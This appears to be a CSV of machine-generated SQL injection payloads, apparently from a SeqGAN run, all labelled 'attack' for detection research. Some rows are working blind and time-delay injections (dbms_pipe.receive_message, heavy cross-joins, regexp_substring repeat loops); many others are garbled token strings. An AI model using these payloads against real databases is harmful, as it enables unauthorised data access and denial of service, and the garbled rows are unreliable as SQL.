label,payload,family,payload_type,method,run_id,sample_index
attack,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,214
attack,-1;,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,215
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,216
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zw""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,217
attack,-77319m5556' like 'm.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,218
attack,1   rgeas where 5485 or and   (  3580  (  =  6093  65  (  2649 2961  cint  (  =  =  =  6849  rdb  (  =  =  =    )  (  =  4799 =  (ap  =  *s  (     )  or 66716388  )  (  =  rs finwdom.tablel2649 t  4018  =  =  =  =  select 8446744073709551610   (  =  1441  =  =     (  113  if 7555   as 6671  (  (      (  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,219
attack,"-4873'   )    or 9643  repep_s as t3  (  select col_efs t3  ||char  (  select   =  =  7555 1087 2642  =  121  =  3352 6849  (  ristagupet""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "" 4018t_ coage5  =  6671 6503  =  char  (      = 3580  (  (  =  3880=  )     (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,220
attack,1'||  (  select 's as dbngd_s where 2724 and concat  =  =    (     else char   (  (  )  6093 2180  =  =  select 1668  =  =  (  *   (  (  re5  = and 2642 6388 7417  (  ral_up_s s tabl_in.t  =  =  4018   (  =  B  =  =  h 2027char 'unusual'  =  7555  =  3393 6388  =  =  3393  * when char  =  (  =  (  2961 6093  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,221
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,222
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """"  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,223
attack,1h'  =  'syyb,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,224
attack,"1'+  (  select 'dos ysadbm.gin.xupq2961 when  =  repd  (  =  (  =  ,  =  3862  =  =    (  =  3862  =  =  =  4018  =  1087(2p  = 7522y  =   char  =  1087 and from  =7555 =  ""ypp_s t2,  =  8691  =  1087  (    =  =  =  select 3862   (  (  = where  =    (  =  100  (  (  118  o(  ,  =  6093 7417  re",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,225
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  't4165ab,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,226
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'where/*",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,227
attack,"1%""  =  ""b",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,228
attack,"1""   and rtrexers  =  =  =  (  (  4799  (  (up  (  g  (  6388 orex  =  =  =  (  6849  65  =    =    =  char  =_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,229
attack,"1     ra""  =  ""  or collbyperedoublmbsinns   rluplexp_s t  select 2724 and  =  =  (  105  =  =  =  =  =  (  =   or char  =    =  (  =  from gepex,500000000xexpex_upp  (  2180 or orell_uses asusta.dbll_usydomtam t2,attchar  2649  +    113   =  2642",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,230
attack,"1%' or 8384  =  like  (  'abcagg,ibb  =  )     )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,231
attack,"1""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,232
attack,"1""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,233
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,234
attack,"1%' like '' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,235
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,236
attack,"1%""   yp  = or f  =  7555 2724  =  =  5485  =  (p_s ain.mainsuns as ablt_ustdb$s t1t2gess ahrdomaas t5  ) where where 2642 9643  (  l  lexL  2961 and or  =  =  =  =  6388  =  1087 char  =  aint  (  3880 4018  (  3880  (  s asefelrepelupdo",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,237
attack,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abgr_kesas whereiyp_usertas t2t3  char  (  (  113  (  ""dskh""  (  3352  (  char  *  (  +char  =  3862 a  =  =     (  =  =  t  (  )  char  7522  (  =  s  (    (  80_upt_( concat  =  3393  =    (  =  99  6671yp  (  x  =  =  u and 2027  =  ,  (  3393ip_tfrom _s cbrefi   6849    ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,238
attack,"1'+  (  select 'fd' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,239
attack,"1'+  (  select ''  )   as juxt where 5956  =  5956 and 8148  =  like  (  'z where om_ubm' like 'l'  =  'talluptrs t2,rdgex   (  =  6671 or _from blepes tsdbls t3   char  =    2774  (  convert 8315  *  (  1087  =  =  =  (  =  =  =  (    (  =  =  *ex  up_sep_in.ret_us aim.serystdgut_k 8571  =  2724 like   =x or 3393  =  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,240
attack,"1%' or 8384  =  like  (  '' or 8384  =  like  (  'aatriomatas andlrep_s tadktepg aser aect_uddbllll_ummdswdmlmvglu' like 'mss as abler  =  =  (  1087  'cgou'  =ef _(    (  ruperzgexp_s t2,ringer_iprl_ungh_saougibsug     )  )   )    aibrtall_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,241
attack,"1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ''+  (  select 'dos attecrdlefint_fdolNt     ,null  (  )  )  =  (  =  5389  =  (  2180  =  rep_s t1,asus trthef 4018t_unt  (    =  3393  88  (  (  (  7793  =  =  (  5485 c char  (  *    (  (  77  char  p  reperinp_t_upiomas t_usustatabstiolL",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,242
attack,1%'||  (  select ''  =  'rdkq'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,243
attack,"1   where(  )    app_t_u_l_s t1l_s tal_ushrs 2832  s t1,dbrt  t  = as congea(  (  (p_upistab$fibnexllegexp_tc t3    =  select or    3352   (  500000000    (  2180  (    = 8691  (  h  =  =  (    =  (  =   char  4799  (  (  =  (  2649  =3862 from t  ap_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,244
attack,"1 reft  (  =  =  6671  =  =ex  =  2961 2724  (  =  =  h,2027pxp_umllladb$ft_ustas t5  )    a  =  =  (  117  =  =  =  =    =  =  2649    (  118  =  105 concat  =    =  ai$tj  (  f c comaintins t1,aounr_mas t3)    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,245
attack,"1""   )    or 3580  =    (  (  =    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,246
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,247
attack,"1' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,248
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,249
attack,"1%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""0%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,250
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,251
attack,1y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,252
attack,"1   whereug  1192,5000000000  ||char  =  select 1661  =  3880  rs ill_imasibmg  un",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,253
attack,1'||  (  select 'nwdbz%amUs   +gerrqabc_ypdomll_umdctrugumNt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,254
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,255
attack,select comas  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,256
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,257
attack,"1""   )    ak  )    (  =_=  i' 6503  = char   =  l_t_k t3  121  2180m,popea t ap_,ableains t1p as t5  as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,258
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,259
attack,"1%""  =  ""g'  +char  =  6093  f=  (  =  cont  (  (  =  ,  (  7793  =  7793  =  3484ief(  =  (  (  =  6849   4018  =  7555 or    from crt3  =  119  * 2642 char  3038_s ft  =  (  =  or whereex as ftex 6503  (  7522  (  6849  (  =  =    (  r t4  (  asibs ft_sibmfty",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,260
attack,"'   )   aomauunt  (  6849p  =  (  ct  (  or 6388 5286  =  =  105(  4018  =  (  =  select or 3862 4018    =  =  select _=  =  =  = char  (  k  =  (  =  =  =  7793 or or(  (  =    =  coubl_in.2 t  +char  )  (  select or 8,ep  =  t  =    (  (  =  char  (  =  2180  les t3 char  es",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,261
attack,-9462io,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,262
attack,"1%%'+  (  select '' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'a' or 'ex    )    (  ""(  char  char  =  =e8899  (  =    )  =    (  (  2961  =  =  =   2642 c(lrl_utainstrrecg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,263
attack,"1   )     )     )   ,0x717a767a71,--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,264
attack,1%' like '' like 'n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,265
attack,"-1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,266
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,267
attack,"-%w""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,268
attack,"1%' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,269
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,270
attack,1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'aadkk,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,271
attack,-4873%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,272
attack,1h' like 'ys 2961,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,273
attack,"1%""   char/*",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,274
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'awd",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,275
attack,"1')erdpcvz'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'n3484r_usedbcdb$gefgeailefcreas tiblepes t2,_us as t2,sus t3)    repet_ungexp_bl_kes ader_kers as t3  8571--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,276
attack,1   )    )    )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,277
attack,"1'""  )   and   (     )  and 3862 or 6388L  ft3(  (  =  4799 and 9643  b  =  =  =  0x7171706a715286  =     )  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,278
attack,1'+  (  select 'at  ab$tzgingupepepex  (  c indolp_ubmtdom..stallomrexpol_ust7793ypnt  (  *  (  4799  selecti--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,279
attack,"1   %e""  =  ""8899  =  =  6671  (  =  rexp_ublll_ustabmdomdbm.strs ailtang,repteibcl_kupdmaul' 9660  7522  )   *  (  =    (  =  6388    =  (  =  )    (  (  3393 t2,r_tchar  =  (  =    r  (  =    =  and and where char  )  (  (  =  =  (  select   (     2642  =  convert 2961 ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,280
attack,"1""   )   or or pex  =  ege  =#' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'ex  =  4018 tchar  (  =  =  =  =  3393      (  =  7555 2027  6388  =  =    =  =  p_imbm.sstas rulint_us where where char  =  (  selectdpp_dom""  =  ""2 and coluntr  (    (  100  =  geaht_up_uppefsefgexp_imaiblllllnins",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,281
attack,"1%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '""  )   or   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,282
attack,"1%'  =  'w'  =  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,283
attack,1'+  (  select 't1kj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,284
attack,"1'   else 2027  =  =  =    =  (  =  =  3352inp  (  0x7171706a71casee_s or 3880  =  =  34845485 or or like aL  (  k  =  (  =  =  2027  (  repex,ro'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'gexp_l_us 2642iblu'  =  '_seat  ( where 4018 char  (  =  rs whereib  (  (  (  4018up_s 6388 char  (  =  =   end   =  ( char  (  =  =  (  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,285
attack,select coumakins,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,286
attack,"18403)   or 8691  =  6849 2961  3862  =  3352 5485   =  =  =  6388  =  =  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '   =  =  rint  (  9643  allep_lapagexp_us as typ""exp_upet    =   (  =  (  =  =     9354  (  =  )     =  =  1087 or and ap_susin.s fmin.taing jwchar   (  113  =  (  lef a    (  7522  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,287
attack,1'   )   upor a  =  =  =_ abllufs t1maibmasustib,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,288
attack,"1""    =    s 5556 where 6671    =  =  2961  =  +char  (  113 79=  (  =  =  =  (  (char  =  6671  5485 3880  =  char  =  (  4165(  2961  =  x  =  (  4018epdoun char  =  6849  =     =  69 1087 7417  =  119  qtc char  (    =  (  *p_erepep_up_sestradoestabl_s syb= in.taleain.r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,289
attack,"1 where  and     (  1087 yp  =   and    =     )  117  )  tchar  (  =  =L  =    =  =  122  =  =  3352 comas s typeaiomastas t2inlsub$t  (  (  =  U char  = 5286    =  =  =    =  4018 or 6093  =  =    =  =    =  =  _updom.rtabmsisNblel3862us t2,iosyx1""  =  ""g",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,290
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'a""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,291
attack,"1%'  then corepp1,domasta,egt2,domainghcalsups domztexp_upt_s t5  =  =       (  or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,292
attack,1zrzvhd%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,293
attack,"1'   =   )    Lp_uppea clet_ubppzrincresib  les    or 2367  (  3862 c6849 2724  (  2180  (  2 char  (  6671  =  rs indddstab$get_un8315  5485  =  (   i/piomnnext=p_dons t  ( char  ( or 4799  =    (  (  cdblyp_t1,at_ibmdpp_l",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,294
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,295
attack,"1yrz where where 2649  (  *  ( 6849  (  =  =  7555  (  =  *x99_ups ribl_ml_umdperdl_mas rdoblt  (  (  (  +char  *  (  (  (  1570  rep1  r_kp2180 aypefhs t2s t1,aintnghr  (  (  =  i  =    (ex  (  (  4018 or char  =  =  =  =  ciomngl",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,296
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,297
attack,"-8673hatqc%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,298
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,299
attack,"1%||z'         )     )   from t2,500000000  =  2027  (   t  =  6849 or from 2642  *  (  (  =  (  6093  (  =  *  2961  (  =  2961    =  _us iin.domypdomain.alum.sinil.at s tomg,ringhdom.co as as asestab$t  (  =    (  (  105  (  =  =  char  (  =  1087  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,300
attack,"--0)2,s where cle"" like ""l_upe_reftypeapes r  (  =  (  =   and   (  7793  (e_s    )    )    = 7417  * when _)     or or 3352  =  =  =  4018  (  88  )   )  h  =  =  7793  =     )    =     orypp  =  1048lqis t3  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,301
